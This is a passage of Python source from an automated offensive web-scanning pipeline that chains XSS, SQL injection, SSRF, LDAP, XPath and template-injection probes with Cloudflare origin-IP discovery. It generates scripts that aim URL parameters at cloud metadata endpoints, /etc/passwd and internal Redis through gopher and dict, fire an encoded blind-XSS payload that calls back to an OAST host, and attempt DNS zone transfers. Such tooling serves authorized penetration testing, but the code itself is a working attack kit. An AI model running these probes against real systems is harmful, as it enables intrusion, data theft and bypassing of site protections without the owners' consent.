                wpscan_cmd.extend(["--cookie", _wps_cookie])
            _wps_headers = os.environ.get("EXTRA_HEADERS", "")
            if _wps_headers:
                for hdr in _wps_headers.split("\n"):
                    hdr = hdr.strip()
                    if hdr:
                        wpscan_cmd.extend(["--header", hdr])
            # WPSCAN_API_TOKEN is read from the environment by wpscan natively,
            # so we do NOT pass it on the CLI to avoid credential exposure via ps.
            wpscan_jobs.append(
                (
                    f"wpscan-{_safe_name(h)}",
                    wpscan_cmd,
                    1800,
                )
            )
    # Clean up stale per-host files from prior runs BEFORE launching new jobs
    # to prevent old artifacts from being re-incorporated into the merge.
    for p in outdir.glob("testssl_*.txt"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("testssl_py_*.txt"):
        p.unlink(missing_ok=True)
    for p in outdir.glob("wpscan_*.txt"):
        p.unlink(missing_ok=True)
    # run both groups in parallel; per-host files remove the race
    await run_parallel(testssl_jobs + wpscan_jobs, outdir)
    n = merge_unique(
        list(outdir.glob("testssl_*.txt")) + list(outdir.glob("testssl_py_*.txt")) + list(outdir.glob("wpscan_*.txt")),
        outdir / "tls_wp.txt",
    )
    # Strip proxychains noise lines that pollute tool output
    tls_wp = outdir / "tls_wp.txt"
    if tls_wp.exists():
        clean = [ln for ln in read_lines(tls_wp) if not ln.startswith("[proxychains]")]
        if len(clean) != n:
            tls_wp.write_text("\n".join(clean) + "\n")
            n = len(clean)
    tls_script.unlink(missing_ok=True)
    return {"10-TLSCMS": str(tls_wp), "count": n}


async def phase_11_INJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, oast_domain: Optional[str], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"11-INJECT"}:
        return {}
    _g_out = outdir / "vulns.txt"
    if _g_out.exists() and not force:
        return {"11-INJECT": str(_g_out), "count": count_nonblank(_g_out)}
    log("info", "Phase 11-INJECT: dalfox → sqlmap → SSRF probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "11-INJECT: no URLs; skipping")
        return {"11-INJECT": str(outdir / "vulns.txt"), "count": 0}
    all_urls = _dedupe_by_host_params(all_urls)
    if oast_domain:
        os.environ["COLLABORATOR"] = oast_domain
    jobs: List[Tuple[str, List[str], int]] = []
    xss_urls = [u for u in all_urls if "=" in u]
    xss_in = ensure(outdir / "urls_xss.txt")
    if xss_urls:
        xss_in.write_text("\n".join(xss_urls) + "\n")
    if xss_urls and t.has("dalfox"):
        # Run pre-filtering tools (kxss, Gxss) BEFORE dalfox since dalfox
        # reads their output files.
        prefilter_jobs: List[Tuple[str, List[str], int]] = []
        kxss_out = outdir / "urls_xss_reflected.txt"
        if t.has("kxss"):
            prefilter_jobs.append((
                "kxss",
                ["kxss", "-l", str(xss_in), "-o", str(kxss_out)],
                600,
            ))
        gxss_out = outdir / "urls_xss_gxss.txt"
        if t.has("Gxss"):
            prefilter_jobs.append((
                "Gxss",
                ["bash", "-c", f"Gxss -o {shlex.quote(str(gxss_out))} < {shlex.quote(str(xss_in))}"],
                600,
            ))
        if prefilter_jobs:
            await run_parallel(prefilter_jobs, outdir)
        # Use Gxss output as dalfox input if kxss is not available
        dalfox_in = (gxss_out if t.has("Gxss") and not t.has("kxss") else
                     kxss_out if t.has("kxss") else xss_in)
        dalfox_cmd = [
            "dalfox", "file", str(dalfox_in), "-S",
            "--output", str(outdir / "xss.txt"),
            "--delay", "500",
            "--no-spinner",
            "--user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "--only-custom-payload",
        ]
        if _PIPELINE_CFG.proxy:
            dalfox_cmd.extend(["--proxy", _PIPELINE_CFG.proxy])
        _dlf_cookie = os.environ.get("COOKIE", "")
        if _dlf_cookie:
            dalfox_cmd.extend(["--cookie", _dlf_cookie])
        _dlf_headers = os.environ.get("EXTRA_HEADERS", "")
        if _dlf_headers:
            for hdr in _dlf_headers.split("\n"):
                hdr = hdr.strip()
                if hdr:
                    dalfox_cmd.extend(["--header", hdr])
        jobs.append(("dalfox", dalfox_cmd, 3600))
    ssrf_urls = [
        u
        for u in all_urls
        if any(k in u.lower() for k in (
            "url=", "uri=", "path=", "dest=", "redirect=", "img=",
            "target=", "site=", "view=", "domain=", "feed=", "host=",
            "to=", "out=", "callback=", "load=", "fetch=", "proxy=",
            "image=", "img_url=", "picture=", "return=", "returnurl=",
            "next=", "continue=", "goto=", "forward=", "port=",
            "endpoint=", "svc=", "api=",
        ))
    ]
    ssrf_in = ensure(outdir / "urls_ssrf.txt")
    if ssrf_urls:
        ssrf_in.write_text("\n".join(ssrf_urls) + "\n")
    # Validate OAST hostname is a single safe token (alnum, dot, dash only)
    # BEFORE splicing it into a script. shlex.quote is belt-and-suspenders.
    if oast_domain and ssrf_urls and _SAFE_HOST.match(oast_domain):
        ssrf_script = outdir / "ssrf_probe.py"
        ssrf_script.write_text(
            "#!/usr/bin/env python3\n"
            '"""SSRF probe: rewrite URL parameters to point at OAST listener and internal targets."""\n'
            "import os, random, sys, urllib.request, urllib.parse, socket\n"
            "_proxy = os.environ.get('PROXY', '')\n"
            "_urlopen = urllib.request.urlopen\n"
            "if _proxy:\n"
            "    if _proxy.startswith(('http://', 'https://')):\n"
            "        _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
            "        _urlopen = urllib.request.build_opener(_handler).open\n"
            "    elif _proxy.startswith(('socks4://', 'socks5://', 'socks5h://', 'socks4a://')):\n"
            "        try:\n"
            "            import socks as _socks\n"
            "            _parsed = urllib.parse.urlparse(_proxy)\n"
            "            _pt = _socks.SOCKS5 if _parsed.scheme.startswith('socks5') else _socks.SOCKS4\n"
            "            _socks.set_default_proxy(_pt, _parsed.hostname, _parsed.port or 1080)\n"
            "            _socks.wrap_module(socket)\n"
            "        except ImportError:\n"
            "            pass\n"
            f"OAST = {json.dumps(oast_domain)}\n"
            f"IN = {json.dumps(str(ssrf_in))}\n"
            "SSRF_PARAMS = {\n"
            "    'url', 'uri', 'path', 'dest', 'redirect', 'img', 'target', 'site',\n"
            "    'view', 'domain', 'feed', 'host', 'to', 'out', 'callback', 'load',\n"
            "    'fetch', 'proxy', 'image', 'img_url', 'picture', 'return', 'returnurl',\n"
            "    'next', 'continue', 'goto', 'forward', 'port', 'endpoint', 'svc', 'api',\n"
            "}\n"
            "INTERNAL_TARGETS = [\n"
            "    f'http://{OAST}/ssrf-{{i}}',\n"
            "    'http://169.254.169.254/latest/meta-data/',\n"
            "    'http://[::1]/',\n"
            "    'http://127.0.0.1:8080/',\n"
            "    'http://127.0.0.1:80/',\n"
            "    'http://0.0.0.0:80/',\n"
            "    'http://localhost:80/',\n"
            "    'file:///etc/passwd',\n"
            "    'gopher://127.0.0.1:6379/_',\n"
            "    'dict://127.0.0.1:6379/info',\n"
            "]\n"
            "import uuid\n"
            "with open(IN) as f:\n"
            "    for line in f:\n"
            "        url = line.strip()\n"
            "        if not url:\n"
            "            continue\n"
            "        # Fire a direct HTTP probe to OAST as a ping (independent of param injection)\n"
            "        try:\n"
            "            ping_url = f'http://{OAST}/ssrf-ping/' + uuid.uuid4().hex[:12]\n"
            "            _urlopen(urllib.request.Request(ping_url, method='GET',\n"
            "                headers={'User-Agent': 'Mozilla/5.0'}), timeout=10)\n"
            "        except Exception:\n"
            "            pass\n"
            "        parsed = urllib.parse.urlparse(url)\n"
            "        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)\n"
            "        for param in SSRF_PARAMS:\n"
            "            if param in qs:\n"
            "                for target in INTERNAL_TARGETS:\n"
            "                    test_qs = qs.copy()\n"
            "                    test_qs[param] = [target.format(i=random.randint(0, 99999))]\n"
            "                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)\n"
            "                    new_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))\n"
            "                    try:\n"
            "                        req = urllib.request.Request(new_url, method='GET',\n"
            "                            headers={'User-Agent': 'Mozilla/5.0'})\n"
            "                        _urlopen(req, timeout=10)\n"
            "                    except Exception:\n"
            "                        pass\n"
        )
        ssrf_script.chmod(0o755)
        jobs.append(("ssrf-probe", ["python3", str(ssrf_script)], 600))
        # Blind XSS — inject a header that will callback to OAST when rendered server-side
        blind_xss_in = ensure(outdir / "urls_xss_blind.txt")
        blind_xss_urls = xss_urls[:_PIPELINE_CFG.sample_urls_xss_blind]
        if blind_xss_urls and oast_domain and _SAFE_HOST.match(oast_domain):
            blind_xss_in.write_text("\n".join(blind_xss_urls) + "\n")
            blind_script = outdir / "blind_xss_probe.py"
            _xss_b64 = base64.b64encode(f"fetch('http://{oast_domain}/blind=xss')".encode()).decode()
            blind_script.write_text(
                "#!/usr/bin/env python3\n"
                '"""Blind XSS probe: Fire requests with XSS payloads that call back to OAST."""\n'
                "import os, sys, urllib.request, socket\n"
                "_proxy = os.environ.get('PROXY', '')\n"
                "_urlopen = urllib.request.urlopen\n"
                "if _proxy:\n"
                "    if _proxy.startswith(('http://', 'https://')):\n"
                "        _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
                "        _urlopen = urllib.request.build_opener(_handler).open\n"
                "    elif _proxy.startswith(('socks4://', 'socks5://', 'socks5h://', 'socks4a://')):\n"
                "        try:\n"
                "            import socks as _socks\n"
                "            _parsed = urllib.parse.urlparse(_proxy)\n"
                "            _pt = _socks.SOCKS5 if _parsed.scheme.startswith('socks5') else _socks.SOCKS4\n"
                "            _socks.set_default_proxy(_pt, _parsed.hostname, _parsed.port or 1080)\n"
                "            _socks.wrap_module(socket)\n"
                "        except ImportError:\n"
                "            pass\n"
                f"OAST = {json.dumps(oast_domain)}\n"
                f"IN = {json.dumps(str(blind_xss_in))}\n"
                f'import os; PAYLOAD = os.environ.get("BLIND_XSS_PAYLOAD") or f\'"><img src=x onerror=eval(atob("{_xss_b64}"))>\'\n'
                "PAYLOAD2 = f'\\'-prompt`{OAST}`-\\''\n"
                "with open(IN) as f:\n"
                "    for line in f:\n"
                "        url = line.strip()\n"
                "        if not url or '=' not in url:\n"
                "            continue\n"
                "        try:\n"
                "            req = urllib.request.Request(url, method='GET',\n"
                "                headers={'User-Agent': PAYLOAD,\n"
                "                        'Referer': PAYLOAD2,\n"
                "                        'X-Forwarded-For': PAYLOAD})\n"
                "            _urlopen(req, timeout=10)\n"
                "        except Exception:\n"
                "            pass\n"
            )
            blind_script.chmod(0o755)
            jobs.append(("blind-xss-probe", ["python3", str(blind_script)], 300))
    elif oast_domain and ssrf_urls:
        log("warn", "11-INJECT: interactsh domain has unsafe characters, skipping SSRF probes")
    await run_parallel(jobs, outdir)
    # Extract actual SQLi findings from sqlmap output instead of dumping raw log
    sqlmap_findings: List[str] = []
    sqlmap_log = outdir / "sqlmap.log"
    if sqlmap_log.exists():
        for ln in read_lines(sqlmap_log):
            lower = ln.lower()
            if any(kw in lower for kw in ("sql injection", "parameter", "payload:", "type: ", "title:")):
                sqlmap_findings.append(ln)
    if sqlmap_findings:
        ensure(outdir / "sqlmap_findings.txt").write_text("\n".join(sqlmap_findings) + "\n")
    # LDAP injection probes on param-bearing URLs
    ldap_findings: List[str] = []
    _ld_urlopen = _get_urlopener()
    _ld_extra_headers = _extra_headers_dict()
    ldap_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_ldap]
    _LDAP_PAYLOADS = ["*", "*)", "*)(uid=*))", "admin*", "*|uid=*", "*)(|(uid=*", "admin(*)"]
    _LDAP_INDICATORS = ["ldap", "filter", "search", "bind", "syntax", "malformed", "error occurred"]
    async def _probe_ldap(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        for pname in qs:
            for payload in _LDAP_PAYLOADS:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers})
                    _, _, body_bytes = await _async_urlopen(_ld_urlopen, req, timeout=8)
                    body = body_bytes.decode("utf-8", errors="ignore").lower()
                    if any(ind in body for ind in _LDAP_INDICATORS):
                        results.append(f"[ldap-candidate] {test_url} param={pname} payload={payload}")
                        break
                except Exception:
                    continue
        return results
    ldap_results = await asyncio.gather(*[_probe_ldap(u) for u in ldap_urls])
    for lr in ldap_results:
        ldap_findings.extend(lr)
    if ldap_findings:
        ensure(outdir / "ldap_injection.txt").write_text("\n".join(ldap_findings) + "\n")
    # XPath injection probes on param-bearing URLs
    xpath_findings: List[str] = []
    _XPATH_PAYLOADS = ["' or '1'='1", "' and '1'='2", "' or 1=1 or '", "'] | //* | //*['"]
    _XPATH_INDICATORS = ["xpath", "xpath exception", "system.xml", "microsoft.xpath", "saxon"]
    async def _probe_xpath(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        baseline_body = None
        try:
            base_req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers})
            _, _, base_bytes = await _async_urlopen(_ld_urlopen, base_req, timeout=8)
            baseline_body = base_bytes.decode("utf-8", errors="ignore")
        except Exception:
            return results
        for pname in qs:
            for payload in _XPATH_PAYLOADS:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_ld_extra_headers})
                    xp_status, _, xp_body_bytes = await _async_urlopen(_ld_urlopen, req, timeout=8)
                    xp_body = xp_body_bytes.decode("utf-8", errors="ignore")
                    if baseline_body is not None and xp_body != baseline_body:
                        results.append(f"[xpath-candidate] {test_url} param={pname} payload={payload}")
                        break
                except Exception:
                    continue
        return results
    xpath_results = await asyncio.gather(*[_probe_xpath(u) for u in ldap_urls])
    for xr in xpath_results:
        xpath_findings.extend(xr)
    if xpath_findings:
        ensure(outdir / "xpath_injection.txt").write_text("\n".join(xpath_findings) + "\n")
    parts = [outdir / "xss.txt", outdir / "sqlmap_findings.txt",
             outdir / "ldap_injection.txt", outdir / "xpath_injection.txt"]
    n = merge_unique([p for p in parts if p.exists()], outdir / "vulns.txt")
    return {"11-INJECT": str(outdir / "vulns.txt"), "count": n}


async def phase_11b_SQLMAP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"11b-SQLMAP"}:
        return {}
    _out = outdir / "sqlmap_findings.txt"
    if _out.exists() and not force:
        return {"11b-SQLMAP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 11b-SQLMAP: sqlmap with enriched parameter set")
    findings: List[str] = []
    # Collect param-bearing URLs from harvested URLs and Arjun-discovered params
    all_urls: List[str] = []
    urls_file = outdir / "urls_all.txt"
    if urls_file.exists():
        all_urls.extend(read_lines(urls_file))
    params_file = prev.get("07-PARAMS", "")
    if params_file and Path(params_file).exists():
        all_urls.extend(read_lines(Path(params_file)))
    deduped = list(dict.fromkeys(all_urls))
    param_urls = [u for u in deduped if "=" in u][:_PIPELINE_CFG.sample_urls_fuzz]
    if not param_urls:
        log("warn", "11b-SQLMAP: no parameter-bearing URLs available; skipping")
        return {"11b-SQLMAP": str(_out), "count": 0}
    candidates = list(param_urls)
    for url in candidates:
        findings.append(f"[candidate] {url}")
    _sql_extra_headers = _extra_headers_dict()
    # Now run sqlmap on the filtered candidates
    if t.has("sqlmap"):
        sqlmap_in = ensure(outdir / "sqlmap_candidates.txt")
        sqlmap_in.write_text("\n".join(sorted(set(candidates))) + "\n")
        sqlmap_dir = outdir / "sqlmap_11b_output"
        runner = outdir / "logs" / "sqlmap_11b_runner.sh"
        _sql_extra = ""
        if _PIPELINE_CFG.proxy:
            _sql_extra += f" --proxy={shlex.quote(_PIPELINE_CFG.proxy)}"
        _sql_headers = "; ".join(f"{k}: {v}" for k, v in _sql_extra_headers.items())
        if _sql_headers:
            _sql_extra += " --headers=" + shlex.quote(_sql_headers)
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(sqlmap_in))}\n"
            f"DIR={shlex.quote(str(sqlmap_dir))}\n"
            'mkdir -p "$DIR"\n'
            f'sqlmap -m "$IN" --batch --level={_PIPELINE_CFG.sqlmap_level} --risk={_PIPELINE_CFG.sqlmap_risk} --random-agent '
            f'--delay={max(_PIPELINE_CFG.delay, 2)} --time-sec=10 '
            f'{_sql_extra}'
            f' --output-dir="$DIR" > "{shlex.quote(str(outdir / "sqlmap_11b.log"))}" 2>&1 || true\n'
        )
        runner.chmod(0o755)
        await _run("sqlmap-11b", ["bash", str(runner)], 7200, outdir)
        sqlmap_log = outdir / "sqlmap_11b.log"
        if sqlmap_log.exists():
            for ln in read_lines(sqlmap_log):
                lower = ln.lower()
                if any(kw in lower for kw in ("sql injection", "parameter", "payload:", "type: ", "title:")):
                    findings.append(ln)
    else:
        findings.append("[info] sqlmap not installed; skipping automated SQL injection testing")
    if not findings:
        findings.append("[result] No SQL injection vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"11b-SQLMAP: {len(findings)} findings → {out}")
    return {"11b-SQLMAP": str(_out), "count": len(findings)}


async def phase_12_SSTI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"12-SSTI"}:
        return {}
    _g2_out = outdir / "ssti.txt"
    if _g2_out.exists() and not force:
        return {"12-SSTI": str(_g2_out), "count": count_nonblank(_g2_out)}
    log("info", "Phase 12-SSTI: SSTI + deep XSS/SQLi fuzzing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "12-SSTI: no URLs; skipping")
        ensure(_g2_out).write_text("")
        return {"12-SSTI": str(_g2_out), "count": 0}
    all_urls = _dedupe_by_host_params(all_urls)
    param_urls = [u for u in all_urls if "=" in u]
    if not param_urls:
        log("warn", "12-SSTI: no param-bearing URLs; skipping")
        ensure(_g2_out).write_text("")
        return {"12-SSTI": str(_g2_out), "count": 0}

    eval_map = {
        "{{7*7}}": "49",
        "${7*7}": "49",
        "#{7*7}": "49",
        "*{7*7}": "49",
        "{{7*'7'}}": "7777777",
        "<%= 7*7 %>": "49",
        "${{7*7}}": "49",
    }

    ssti_findings: List[str] = []
    seen_ssti: Set[str] = set()
    _ssti_extra_headers = _extra_headers_dict()
    _ssti_urlopen = _get_urlopener()

    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            for payload, expected in eval_map.items():
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                if test_url in seen_ssti:
                    continue
                seen_ssti.add(test_url)
                await _throttle_rate()
                try:
                    _ssti_req_hdr = {"User-Agent": "Mozilla/5.0"}
                    _ssti_req_hdr.update(_ssti_extra_headers)
                    req = urllib.request.Request(
                        test_url,
                        headers=_ssti_req_hdr,
                    )
                    _, _, body_bytes = await _async_urlopen(_ssti_urlopen, req, timeout=15)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    if expected in body:
                        ssti_findings.append(
                            f"[SSTI-evaluated] {test_url} param={param_name} payload={payload} → {expected}"
                        )
                    elif payload in body:
                        ssti_findings.append(
                            f"[SSTI-reflected-only] {test_url} param={param_name} payload={payload}"
                        )
                except Exception:
                    continue

    ensure(outdir / "ssti.txt").write_text(
        "\n".join(ssti_findings) + ("\n" if ssti_findings else "")
    )
    log("ok", f"12-SSTI: {len(ssti_findings)} SSTI reflections detected")
    return {"12-SSTI": str(outdir / "ssti.txt"), "count": len(ssti_findings)}


async def phase_13_OOB(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, oast: Interactsh, force: bool = False) -> Dict[str, Any]:
    if skip & {"13-OOB"}:
        return {}
    _h_out = outdir / "oast" / "callbacks.txt"
    if _h_out.exists() and not force:
        return {"13-OOB": str(_h_out), "count": count_nonblank(_h_out)}
    log("info", "Phase 13-OOB: OAST callback collection")
    out = oast.stop()
    n = count_nonblank(out)
    if n:
        log("ok", f"13-OOB: {n} OOB callback(s) captured")
    else:
        log("info", "13-OOB: no OOB callbacks captured")
    return {"13-OOB": str(out), "count": n}


# ─────────────────────────── manual-testing phases ──────────────────────────
# Phases 14-ORIGIN–L address gaps that automated scanners often miss but can be
# partially automated with targeted scripts and API calls.
# ───────────────────── Phase 14-ORIGIN: origin IP bypass ────────────────────────────
async def phase_14_ORIGIN(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"14-ORIGIN"}:
        return {}
    _j_out = outdir / "origin.txt"
    if _j_out.exists() and not force:
        return {"14-ORIGIN": str(_j_out), "count": count_nonblank(_j_out)}
    log("info", "Phase 14-ORIGIN: origin IP bypass enumeration")
    findings: List[str] = []
    _j_extra_headers = _extra_headers_dict()
    _j_urlopen = _get_urlopener()
    hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
    if not hosts_file.exists():
        hosts_file = outdir / "resolved.txt"
    have_hosts = hosts_file.exists() and bool(read_lines(hosts_file))
    # 1. Favicon hash
    favicon_urls = []
    if have_hosts:
        for h in read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_origin]:
            base = h if h.startswith("http") else f"https://{h}"
            favicon_urls.append(base.rstrip("/") + "/favicon.ico")
    if not favicon_urls:
        favicon_urls = [f"https://{domain}/favicon.ico"]
    for url in favicon_urls:
        try:
            _j_fav_hdr = {"User-Agent": "Mozilla/5.0"}
            _j_fav_hdr.update(_j_extra_headers)
            req = urllib.request.Request(url, headers=_j_fav_hdr, method="GET")
            _, _, data = await _async_urlopen(_j_urlopen, req, timeout=10)
            if data:
                h = _mmh3_hash(data) & 0xFFFFFFFF
                findings.append(f"favicon_hash={h} (url={url})")
                findings.append(
                    f"  Shodan: https://www.shodan.io/search?query=http.favicon.hash:{h}"
                )
                findings.append(
                    f"  Shodan (org): https://www.shodan.io/search?query=org:%22Cloudflare%22+http.favicon.hash:{h}"
                )
                break
        except Exception:
            continue
    # 2. crt.sh certificate history
    crt_urls = [
        f"https://crt.sh/?q={domain}&output=json",
        f"https://crt.sh/?q=%25.{domain}&output=json",
    ]
    crt_found_any = False
    for crt_url in crt_urls:
        if crt_found_any:
            break
        try:
            _j_crt_hdr = {"User-Agent": "Mozilla/5.0"}
            _j_crt_hdr.update(_j_extra_headers)
            req = urllib.request.Request(crt_url, headers=_j_crt_hdr)
            _, _, crt_raw = await _async_urlopen(_j_urlopen, req, timeout=15)
            raw = crt_raw.decode("utf-8", errors="ignore")
            certs = json.loads(raw)
            if not isinstance(certs, list) or not certs:
                continue
            ips: Set[str] = set()
            subdomains: Set[str] = set()
            for c in certs if isinstance(certs, list) else []:
                if isinstance(c, dict):
                    nv = c.get("name_value", "")
                    for name in nv.split("\n"):
                        name = name.strip().lower()
                        if name and _is_valid_hostname(name):
                            subdomains.add(name)
            # Try to resolve a few subdomains to find non-CF IPs
            resolved = [s for s in subdomains if s != domain][:_PIPELINE_CFG.sample_hosts_origin]
            if t.has("dnsx") and resolved:
                crt_subs = outdir / "crt_subs.txt"
                ensure(crt_subs).write_text("\n".join(resolved) + "\n")
                crt_resolved = outdir / "crt_resolved.txt"
                await _run(
                    "dnsx-crt",
                    [
                        "dnsx",
                        "-silent",
                        "-l",
                        str(crt_subs),
                        "-o",
                        str(crt_resolved),
                        "-a",
                        "-resp",
                    ],
                    300,
                    outdir,
                )
                if crt_resolved.exists():
                    for ln in read_lines(crt_resolved):
                        parts = ln.split()
                        if len(parts) >= 3:
                            ip = parts[-1].strip("[]")
                            if ip and ip.count(".") == 3:
                                ips.add(ip)
            if ips:
                findings.append(f"crt.sh: {len(subdomains)} subdomains, {len(ips)} unique IPs")
                for ip in list(ips)[:10]:
                    findings.append(f"  origin_candidate={ip}")
            crt_found_any = True
        except Exception:
            continue
    # 3. MX records (often not proxied by Cloudflare)
    # Use public DNS resolver to avoid local stub resolver issues over proxychains
    mx_file = outdir / "mx_records.txt"
    _DNS_RESOLVER = os.environ.get("DNS_RESOLVER", "@8.8.8.8")
    if t.has("dig"):
        _dig_cmd = _proxify_cmd(["dig", "+short", _DNS_RESOLVER, "mx", domain])
        proc = await asyncio.create_subprocess_exec(
            *_dig_cmd,
            stdin=asyncio.subprocess.DEVNULL,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            stdout = b""
        mx = stdout.decode("utf-8", errors="ignore").strip()
        if mx and not mx.startswith(";"):
            ensure(mx_file).write_text(mx + "\n")
            for ln in mx.splitlines():
                ln = ln.strip()
                if ln:
                    findings.append(f"mx_record={ln}")
                    # Try resolving the MX target
                    mx_host = (ln.split()[-1] if len(ln.split()) > 1 else ln).rstrip(".")
                    if t.has("dig"):
                        try:
                            _dig2_cmd = _proxify_cmd(["dig", "+short", _DNS_RESOLVER, mx_host.rstrip(".")])
                            proc2 = await asyncio.create_subprocess_exec(
                                *_dig2_cmd,
                                stdin=asyncio.subprocess.DEVNULL,
                                stdout=asyncio.subprocess.PIPE,
                                stderr=asyncio.subprocess.DEVNULL,
                            )
                            out2, _ = await asyncio.wait_for(proc2.communicate(), timeout=10)
                        except asyncio.TimeoutError:
                            proc2.kill()
                            await proc2.wait()
                            out2 = b""
                        for mip in out2.decode().splitlines():
                            mip = mip.strip()
                            if mip and mip.count(".") == 3:
                                findings.append(f"  mx_ip={mip} (non-CF origin candidate)")
    # 3b. DNS zone transfer attempt (AXFR) — low success rate but high impact
    if t.has("dig"):
        try:
            _ns_cmd = _proxify_cmd(["dig", "+short", _DNS_RESOLVER, "ns", domain])
            ns_proc = await asyncio.create_subprocess_exec(
                *_ns_cmd,
                stdin=asyncio.subprocess.DEVNULL,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            ns_out, _ = await asyncio.wait_for(ns_proc.communicate(), timeout=10)
            for ns_line in ns_out.decode(errors="ignore").splitlines():
                ns = ns_line.strip().rstrip(".")
                if not ns or not _is_valid_hostname(ns):
                    continue
                try:
                    _axfr_cmd = _proxify_cmd(["dig", "axfr", f"@{ns}", domain])
                    axfr_proc = await asyncio.create_subprocess_exec(
                        *_axfr_cmd,
                        stdin=asyncio.subprocess.DEVNULL,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.DEVNULL,
                    )
                    axfr_out, _ = await asyncio.wait_for(axfr_proc.communicate(), timeout=15)
                    axfr_text = axfr_out.decode(errors="ignore")
                    # dig axfr returns exit code 0 even on failure; check for
                    # actual zone data (SOA record) vs "Transfer failed"
                    _axfr_has_data = (
                        "SOA" in axfr_text
                        and "Transfer failed" not in axfr_text
                    )
                    if _axfr_has_data:
                        findings.append(f"  axfr_success=YES (ns={ns}) — zone data follows")
                        for axfr_ln in axfr_text.splitlines()[:20]:
                            findings.append(f"    {axfr_ln[:120]}")
                except Exception:
                    continue
        except Exception:
            pass
    # 3c. SPF / DMARC / DKIM DNS record checks (all use TXT records)
    if t.has("dig"):
        for rec, label in (("txt", "SPF"), ("txt", "DMARC"), ("txt", "DKIM")):
            query = f"_dmarc.{domain}" if label == "DMARC" else (
                f"default._domainkey.{domain}" if label == "DKIM" else domain)
            try:
                _sp_cmd = _proxify_cmd(["dig", "+short", _DNS_RESOLVER, "txt", query])
                sp_proc = await asyncio.create_subprocess_exec(
                    *_sp_cmd,
                    stdin=asyncio.subprocess.DEVNULL,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                sp_out, _ = await asyncio.wait_for(sp_proc.communicate(), timeout=10)
                sp_text = sp_out.decode(errors="ignore")
                if sp_text.strip():
                    findings.append(f"  {label}_records:")
                    for sp_ln in sp_text.splitlines()[:5]:
                        findings.append(f"    {sp_ln[:200]}")
                    if "v=spf1" in sp_text.lower() and "~all" in sp_text.lower():
                        findings.append(f"    → {label}: softfail (~all) — may be spoofable")
                    elif "v=spf1" in sp_text.lower() and "?all" in sp_text.lower():
                        findings.append(f"    → {label}: neutral (?all) — no enforcement")
                    elif "v=spf1" in sp_text.lower() and "-all" not in sp_text.lower():
                        findings.append(f"    → {label}: no hardfail — consider -all")
            except Exception:
                continue
    # 4. Check resolved IPs against Cloudflare ASN (with local caching)
    resolved_path = Path(prev.get("02-RESOLVE") or outdir / "resolved_full.txt")
    ipcache = outdir / ".ipinfo_cache.json"
    ipcache_data: Dict[str, dict] = {}
    if ipcache.exists():
        try:
            ipcache_data = json.loads(ipcache.read_text(encoding="utf-8", errors="ignore"))
        except (json.JSONDecodeError, ValueError):
            ipcache_data = {}
    if resolved_path.exists():
        resolved_ips: Set[str] = set()
        for ln in read_lines(resolved_path):
            parts = ln.split()
            if len(parts) >= 3 and parts[-2].strip("[]") == "A":
                # Only A-record lines: host [A] [1.2.3.4]
                ip = parts[-1].strip("[]")
                if ip and ip.count(".") == 3:
